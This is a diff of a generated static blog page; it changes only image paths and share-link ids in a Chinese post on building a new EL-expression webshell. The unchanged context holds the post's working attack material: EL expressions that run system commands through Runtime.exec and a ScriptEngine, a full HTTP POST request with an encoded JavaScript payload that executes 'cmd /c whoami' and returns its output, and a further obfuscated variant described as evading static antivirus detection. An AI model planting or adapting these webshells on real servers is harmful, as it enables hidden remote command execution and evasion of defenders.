@@ -123,7 +123,7 @@
 <h2 id="0x01-简单尝试与回显问题"><a href="#0x01-简单尝试与回显问题" class="headerlink" title="0x01 简单尝试与回显问题"></a>0x01 简单尝试与回显问题</h2><p>我们使用开头提到的EL表达式来试一试：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Runtime.getRuntime().exec(param.cmd)&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/./image-20220907140149065.png" alt="image-20220907140149065"></p>
+<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png" alt="image-20220907140149065"></p>
 <p>执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：<strong>调用ScriptEngine来执行js</strong>。</p>
 <blockquote>
 <p>我们使用ScriptEngine构造出的webshell是这样的：</p>
@@ -145,7 +145,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /test.jsp?spr1=javax.script.ScriptEngineManager HTTP/1.1</span><br><span class="line">Host: 172.20.10.2:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=4A34A77B78CD48404804BFD7420A0195</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 414</span><br><span class="line"></span><br><span class="line">spr2=try&#123;load(&quot;nashorn%3amozilla_compat.js&quot;)%3b&#125;catch(e)&#123;&#125;importPackage(Packages.java.util)%3bimportPackage(Packages.java.lang)%3bimportPackage(Packages.java.io)%3bs%3d[2]%3bs[0]%3d&#x27;cmd&#x27;%3bs[1]%3d&#x27;/c+whoami&#x27;%3ba%3d&quot;&quot;%3bb%3djava.lang.Runtime.getRuntime().exec(s).getInputStream()%3boutput+%3d+new+BufferedReader(new+InputStreamReader(b))%3bwhile+((line%3doutput.readLine())+!%3d+null)+&#123;a%3da%2bline%2b&quot;\n&quot;&#125;%3ba</span><br></pre></td></tr></table></figure>
 
 <p>然后执行，没有问题。</p>
-<p><img src="/./image-20220907140219279.png" alt="image-20220907140219279"></p>
+<p><img src="/.2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p>
 <h2 id="0x03-进一步混淆"><a href="#0x03-进一步混淆" class="headerlink" title="0x03 进一步混淆"></a>0x03 进一步混淆</h2><p>虽然已经可以通过传递指定js脚本执行命令，但仔细来看</p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;</span><br></pre></td></tr></table></figure>
 
@@ -161,7 +161,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;&quot;[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)&#125;</span><br></pre></td></tr></table></figure>
 
 <p>测试后可以执行：</p>
-<p><img src="/./image-20220902101416244.png" alt="image-20220902101416244"></p>
+<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png" alt="image-20220902101416244"></p>
 <p>这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。</p>
 <h2 id="0x04-小总结"><a href="#0x04-小总结" class="headerlink" title="0x04 小总结"></a>0x04 小总结</h2><p>这个小思路也是启发于星球里的师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的变种。</p>
 <p>我们从最初的</p>
@@ -183,7 +183,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/" data-id="cl7ylpj7k000118ilft2ogigo" data-title="新型EL webshell初探" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/" data-id="cl7ylxr5m000168ild5ah6c8p" data-title="新型EL webshell初探" class="article-share-link">Share</a>
       
       
       
@@ -234,7 +234,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/12/hello-world/" data-id="cl7ylpj7g000018il4neceywu" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/09/12/hello-world/" data-id="cl7ylxr5i000068ilgakg5co5" data-title="Hello World" class="article-share-link">Share</a>
       
       
       
